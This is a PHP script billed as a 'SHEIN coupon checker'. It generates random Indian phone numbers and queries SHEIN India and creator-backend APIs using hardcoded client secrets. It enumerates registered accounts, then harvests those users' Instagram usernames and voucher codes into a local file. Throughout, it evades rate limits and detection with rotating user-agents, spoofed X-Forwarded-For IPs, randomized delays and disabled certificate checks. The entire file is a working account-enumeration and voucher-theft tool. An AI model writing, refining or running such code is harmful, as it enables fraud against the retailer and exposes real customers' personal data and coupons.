<?php
// File to save valid coupons
$validFile = getenv('USERPROFILE') . '/Desktop/Downloads/shein_valid.txt';

// List of User-Agents to rotate
$userAgents = [
    // Android devices
    'Dalvik/2.1.0 (Linux; U; Android 12; SM-G991B Build/SP1A.210812.016)',
    'Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 10 Pro Build/RKQ1.200826.002)',
    'Dalvik/2.1.0 (Linux; U; Android 10; POCO X2 Build/QKQ1.190825.002)',
    'Dalvik/2.1.0 (Linux; U; Android 9; Nokia 6.1 Plus Build/PPR1.180610.011)',
    'Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1807 Build/OPM1.171019.026)',
    
    // Chrome on Android
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
    
    // Samsung Browser
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36',
    
    // Desktop Chrome (fallback)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58',
];

// List of different IP ranges
$ipRanges = [
    ['103.150.0.0', '103.150.255.255'],  // India
    ['103.151.0.0', '103.151.255.255'],
    ['103.152.0.0', '103.152.255.255'],
    ['14.139.0.0', '14.139.255.255'],
    ['14.140.0.0', '14.140.255.255'],
    ['117.200.0.0', '117.200.255.255'],
    ['117.201.0.0', '117.201.255.255'],
    ['49.36.0.0', '49.36.255.255'],
    ['49.37.0.0', '49.37.255.255'],
    ['27.4.0.0', '27.4.255.255'],
];

function getRandomUserAgent() {
    global $userAgents;
    return $userAgents[array_rand($userAgents)];
}

function getRandomIP() {
    global $ipRanges;
    $range = $ipRanges[array_rand($ipRanges)];
    $start = ip2long($range[0]);
    $end = ip2long($range[1]);
    return long2ip(mt_rand($start, $end));
}

function getRandomDelay() {
    return mt_rand(1000000, 3000000); // 1-3 seconds in microseconds
}

// Advanced HTTP function with multiple fallbacks
function httpCall($url, $data = null, $headers = [], $method = "GET") {
    static $lastCallTime = 0;
    
    // Add random delay between calls
    if ($lastCallTime > 0) {
        $delay = getRandomDelay();
        usleep($delay);
    }
    $lastCallTime = microtime(true);
    
    // Try multiple methods
    $methods = ['method1', 'method2', 'method3'];
    
    foreach ($methods as $httpMethod) {
        $result = callHttpMethod($httpMethod, $url, $data, $headers, $method);
        if ($result !== false && !empty($result)) {
            return $result;
        }
        
        // Delay between retries
        usleep(mt_rand(500000, 1500000)); // 0.5-1.5 seconds
    }
    
    return "";
}

function callHttpMethod($methodType, $url, $data, $headers, $httpMethod) {
    switch ($methodType) {
        case 'method1': // Using cURL if available
            if (function_exists('curl_init')) {
                return curlCall($url, $data, $headers, $httpMethod);
            }
            break;
            
        case 'method2': // Using stream_socket_client
            return socketCall($url, $data, $headers, $httpMethod);
            
        case 'method3': // Using file_get_contents with context
            return fileGetCall($url, $data, $headers, $httpMethod);
    }
    
    return false;
}

function curlCall($url, $data, $headers, $method) {
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => 'gzip, deflate',
        CURLOPT_MAXREDIRS => 5,
    ]);
    
    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    
    if ($method === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    }
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function socketCall($url, $data, $headers, $method) {
    $parsed = parse_url($url);
    $host = $parsed['host'];
    $path = $parsed['path'] ?? '/';
    
    if (isset($parsed['query'])) {
        $path .= '?' . $parsed['query'];
    }
    
    $port = $parsed['port'] ?? 443;
    
    $context = stream_context_create([
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true,
        ]
    ]);
    
    $fp = @stream_socket_client("ssl://$host:$port", $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $context);
    
    if (!$fp) return false;
    
    // Build request
    $request = "$method $path HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    
    if (empty($headers)) {
        $ip = getRandomIP();
        $ua = getRandomUserAgent();
        $request .= "X-Forwarded-For: $ip\r\n";
        $request .= "User-Agent: $ua\r\n";
        $request .= "Accept: */*\r\n";
    } else {
        foreach ($headers as $header) {
            $request .= "$header\r\n";
        }
    }
    
    if ($method === "POST" && $data) {
        $request .= "Content-Length: " . strlen($data) . "\r\n";
    }
    
    $request .= "Connection: close\r\n\r\n";
    
    if ($method === "POST" && $data) {
        $request .= $data;
    }
    
    fwrite($fp, $request);
    
    $response = '';
    while (!feof($fp)) {
        $response .= fread($fp, 8192);
    }
    
    fclose($fp);
    
    // Extract body
    $parts = explode("\r\n\r\n", $response, 2);
    return count($parts) > 1 ? $parts[1] : $response;
}

function fileGetCall($url, $data, $headers, $method) {
    $options = [
        'http' => [
            'method' => $method,
            'timeout' => 10,
            'ignore_errors' => true,
            'header' => implode("\r\n", $headers),
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ]
    ];
    
    if ($method === "POST" && $data) {
        $options['http']['content'] = $data;
    }
    
    $context = stream_context_create($options);
    
    // Multiple attempts
    for ($i = 0; $i < 2; $i++) {
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            return $result;
        }
        usleep(500000);
    }
    
    return false;
}

function genDeviceId() {
    $chars = 'abcdef0123456789';
    $id = '';
    for ($i = 0; $i < 32; $i++) {
        $id .= $chars[mt_rand(0, 15)];
    }
    return $id;
}

function generateIndianNumber() {
    $prefixes = ['8', '9'];
    $prefix = $prefixes[array_rand($prefixes)];
    
    $number = $prefix;
    for ($i = 0; $i < 9; $i++) {
        $number .= mt_rand(0, 9);
    }
    
    return $number;
}

function checkNumber($number, &$triedNumbers, &$sessionCookies = []) {
    if (in_array($number, $triedNumbers)) {
        return false;
    }
    
    $triedNumbers[] = $number;
    echo "🔍 Checking: $number\n";
    
    $ip = getRandomIP();
    $adId = genDeviceId();
    $userAgent = getRandomUserAgent();
    
    // LONGER DELAY BEFORE STARTING
    usleep(mt_rand(2000000, 4000000)); // 2-4 seconds
    
    // Step 1: Get access token with multiple attempts
    $access_token = null;
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        $url = "https://api.sheinindia.in/uaas/jwt/token/client";
        $headers = [
            "Client_type: Android/29",
            "Accept: application/json",
            "Client_version: 1.0.8",
            "User-Agent: $userAgent",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "X-Tenant: B2C",
            "Content-Type: application/x-www-form-urlencoded",
            "X-Forwarded-For: $ip",
            "Accept-Encoding: gzip, deflate",
            "Connection: Keep-Alive"
        ];
        
        $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
        $res = httpCall($url, $data, $headers, "POST");
        
        if (!empty($res)) {
            $j = @json_decode($res, true);
            if ($j && isset($j['access_token'])) {
                $access_token = $j['access_token'];
                echo "✅ Token obtained (Attempt $attempt)\n";
                break;
            }
        }
        
        if ($attempt < 3) {
            echo "⚠️ Token attempt $attempt failed, retrying...\n";
            sleep(mt_rand(2, 4)); // Longer delay between retries
        }
    }
    
    if (!$access_token) {
        echo "❌ Token failed after 3 attempts\n";
        return false;
    }
    
    // DELAY BETWEEN API CALLS
    usleep(mt_rand(1500000, 3000000)); // 1.5-3 seconds
    
    // Step 2: Check account
    $url = "https://api.sheinindia.in/uaas/accountCheck";
    $headers = [
        "Authorization: Bearer $access_token",
        "Requestid: account_check",
        "X-Tenant: B2C",
        "Accept: application/json",
        "User-Agent: $userAgent",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip",
        "Accept-Encoding: gzip, deflate"
    ];
    
    $data = "mobileNumber=$number";
    $res = httpCall($url, $data, $headers, "POST");
    
    if (empty($res)) {
        echo "❌ Account check failed\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    
    if (!$j) {
        echo "❌ Invalid account response\n";
        return false;
    }
    
    if (isset($j['success']) && $j['success'] === false) {
        echo "❌ Number not registered\n";
        return false;
    }
    
    $encryptedId = $j['encryptedId'] ?? '';
    if (empty($encryptedId)) {
        echo "❌ No encrypted ID\n";
        return false;
    }
    
    echo "✅ Account exists\n";
    
    // LONG DELAY BEFORE NEXT API
    usleep(mt_rand(2500000, 4000000)); // 2.5-4 seconds
    
    // Step 3: Get SHEIN token
    $payload = json_encode([
        "client_type" => "Android/29",
        "client_version" => "1.0.8",
        "gender" => "",
        "phone_number" => $number,
        "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
        "user_id" => $encryptedId,
        "user_name" => ""
    ]);
    
    $headers = [
        "Accept: application/json",
        "User-Agent: $userAgent",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/json; charset=UTF-8",
        "X-Forwarded-For: $ip",
        "Accept-Encoding: gzip, deflate"
    ];
    
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
    $res = httpCall($url, $payload, $headers, "POST");
    
    if (empty($res)) {
        echo "❌ SHEIN token failed\n";
        return false;
    }
    
    $j = @json_decode($res, true);
    
    if (!$j || empty($j['access_token'])) {
        echo "❌ Invalid SHEIN token\n";
        return false;
    }
    
    $sheinverse_access_token = $j['access_token'];
    echo "✅ SHEIN token obtained\n";
    
    // LONG DELAY
    usleep(mt_rand(3000000, 5000000)); // 3-5 seconds
    
    // Step 4: Get user data
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
    $headers = [
        "Host: shein-creator-backend-151437891745.asia-south1.run.app",
        "Authorization: Bearer $sheinverse_access_token",
        "User-Agent: $userAgent",
        "Accept: */*",
        "Origin: https://sheinverse.galleri5.com",
        "X-Requested-With: com.ril.shein",
        "Referer: https://sheinverse.galleri5.com/",
        "Content-Type: application/json",
        "X-Forwarded-For: $ip",
        "Accept-Encoding: gzip, deflate"
    ];
    
    $res = httpCall($url, "", $headers, "GET");
    
    if (empty($res)) {
        echo "❌ User data failed\n";
        return false;
    }
    
    $decoded = @json_decode($res, true);
    
    // Try gzip decode
    if ($decoded === null) {
        $uncompressed = @gzdecode($res);
        if ($uncompressed !== false) {
            $decoded = @json_decode($uncompressed, true);
        }
    }
    
    if (!$decoded || !isset($decoded['user_data']['instagram_data']['username'])) {
        echo "❌ No user data found\n";
        return false;
    }
    
    $username = $decoded['user_data']['instagram_data']['username'] ?? 'N/A';
    $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
    $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
    $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
    $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
    
    // Check for valid coupon
    if ($voucher !== 'N/A' && !empty($voucher) && $voucher !== '') {
        echo "\n" . str_repeat("✨", 25) . "\n";
        echo "🎉🎉🎉 COUPON FOUND! 🎉🎉🎉\n";
        echo str_repeat("✨", 25) . "\n\n";
        echo "📱 Number: $number\n";
        echo "📸 Instagram: $username\n";
        echo "🎫 Voucher Code: $voucher\n";
        echo "💰 Amount: ₹$voucher_amount\n";
        echo "💵 Min Purchase: ₹$min_purchase_amount\n";
        echo "📅 Expiry: $expiry_date\n";
        echo "🌐 IP Used: $ip\n";
        echo "🤖 User-Agent: " . substr($userAgent, 0, 50) . "...\n\n";
        
        // Save to file
        $saveData = "========================================\n";
        $saveData .= "Number: $number\n";
        $saveData .= "Instagram: $username\n";
        $saveData .= "Voucher Code: $voucher\n";
        $saveData .= "Amount: ₹$voucher_amount\n";
        $saveData .= "Min Purchase: ₹$min_purchase_amount\n";
        $saveData .= "Expiry Date: $expiry_date\n";
        $saveData .= "IP Used: $ip\n";
        $saveData .= "Found At: " . date('Y-m-d H:i:s') . "\n";
        $saveData .= "========================================\n\n";
        
        file_put_contents($GLOBALS['validFile'], $saveData, FILE_APPEND);
        
        // Make sound
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            for ($i = 0; $i < 5; $i++) {
                echo "\x07";
                usleep(200000);
            }
        }
        
        return true;
    } else {
        echo "✅ No coupon (Username: $username)\n";
        return false;
    }
}

// Main script
function clearScreen() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        system('cls');
    } else {
        system('clear');
    }
}

clearScreen();
echo "========================================\n";
echo "   SHEIN COUPON CHECKER - ULTRA MODE   \n";
echo "========================================\n\n";
echo "⚡ Features:\n";
echo "• Rotating User-Agents (" . count($userAgents) . " agents)\n";
echo "• Rotating IPs (" . count($ipRanges) . " ranges)\n";
echo "• Random delays (1-5 seconds)\n";
echo "• Multiple HTTP methods\n";
echo "• 3 retry attempts per API\n";
echo "• Auto-save to: $validFile\n\n";
echo "🛑 Press Ctrl+C to stop\n";
echo str_repeat("=", 40) . "\n\n";

// Create directory
$dir = dirname($validFile);
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}

// Test connection
echo "🔌 Testing connection... ";
$testUrl = "https://api.sheinindia.in/uaas/jwt/token/client";
$testHeaders = [
    "Client_type: Android/29",
    "Accept: application/json",
    "User-Agent: " . getRandomUserAgent(),
    "Content-Type: application/x-www-form-urlencoded",
    "X-Forwarded-For: " . getRandomIP()
];

$testRes = httpCall($testUrl, "grantType=client_credentials", $testHeaders, "POST");
if (!empty($testRes)) {
    $json = @json_decode($testRes, true);
    if ($json && isset($json['access_token'])) {
        echo "✅ SUCCESS! API is working\n\n";
    } else {
        echo "⚠️ Connected but invalid response\n\n";
    }
} else {
    echo "❌ Cannot connect. Trying with longer delays...\n\n";
    // Increase delays even more
    sleep(5);
}

$triedNumbers = [];
$foundCount = 0;
$checkedCount = 0;
$batchSize = 2; // SMALL batch size for stability

// Session cookies storage
$sessionCookies = [];

while (true) {
    // Generate numbers
    $numbers = [];
    for ($i = 0; $i < $batchSize; $i++) {
        $num = generateIndianNumber();
        while (in_array($num, $triedNumbers)) {
            $num = generateIndianNumber();
        }
        $numbers[] = $num;
    }
    
    echo "📦 Batch " . (int)($checkedCount/$batchSize + 1) . ": " . implode(" ", $numbers) . "\n";
    echo str_repeat("─", 60) . "\n";
    
    $batchStart = microtime(true);
    
    foreach ($numbers as $index => $number) {
        $checkedCount++;
        echo "\n[#{$checkedCount}] ";
        
        $startTime = microtime(true);
        $result = checkNumber($number, $triedNumbers, $sessionCookies);
        $timeTaken = round(microtime(true) - $startTime, 2);
        
        if ($result) {
            $foundCount++;
            echo "🏆 COUPON FOUND! Total: $foundCount\n";
            
            // Extra long delay after finding coupon
            echo "😴 Taking a break... ";
            sleep(mt_rand(8, 12));
            echo "Continuing...\n";
        }
        
        echo "⏱️  Request time: {$timeTaken}s\n";
        
        // Extra delay between numbers in same batch
        if ($index < count($numbers) - 1) {
            $delay = mt_rand(3000000, 6000000); // 3-6 seconds
            echo "⏳ Waiting " . round($delay/1000000, 1) . "s before next number...\n";
            usleep($delay);
        }
    }
    
    $batchTime = round(microtime(true) - $batchStart, 2);
    echo "\n" . str_repeat("═", 60) . "\n";
    echo "📊 BATCH COMPLETE\n";
    echo "⏱️  Batch time: {$batchTime}s\n";
    echo "✅ Checked: $checkedCount | 🎉 Found: $foundCount\n";
    echo str_repeat("═", 60) . "\n\n";
    
    // Long delay between batches
    $nextDelay = mt_rand(10, 20);
    echo "😴 Taking a long break before next batch...\n";
    for ($i = $nextDelay; $i > 0; $i--) {
        echo "\r⏳ Next batch in {$i} seconds... " . str_repeat(".", $nextDelay - $i);
        sleep(1);
    }
    echo "\n";
    
    clearScreen();
    echo "========================================\n";
    echo "   SHEIN COUPON CHECKER - ULTRA MODE   \n";
    echo "========================================\n\n";
    echo "📈 Progress:\n";
    echo "• Numbers checked: $checkedCount\n";
    echo "• Coupons found: $foundCount\n";
    echo "• Success rate: " . ($checkedCount > 0 ? round(($foundCount/$checkedCount)*100, 2) : 0) . "%\n";
    echo "• Saving to: " . basename($validFile) . "\n";
    echo "• Current IP: " . getRandomIP() . "\n";
    echo "• Next batch size: $batchSize numbers\n\n";
}
?>
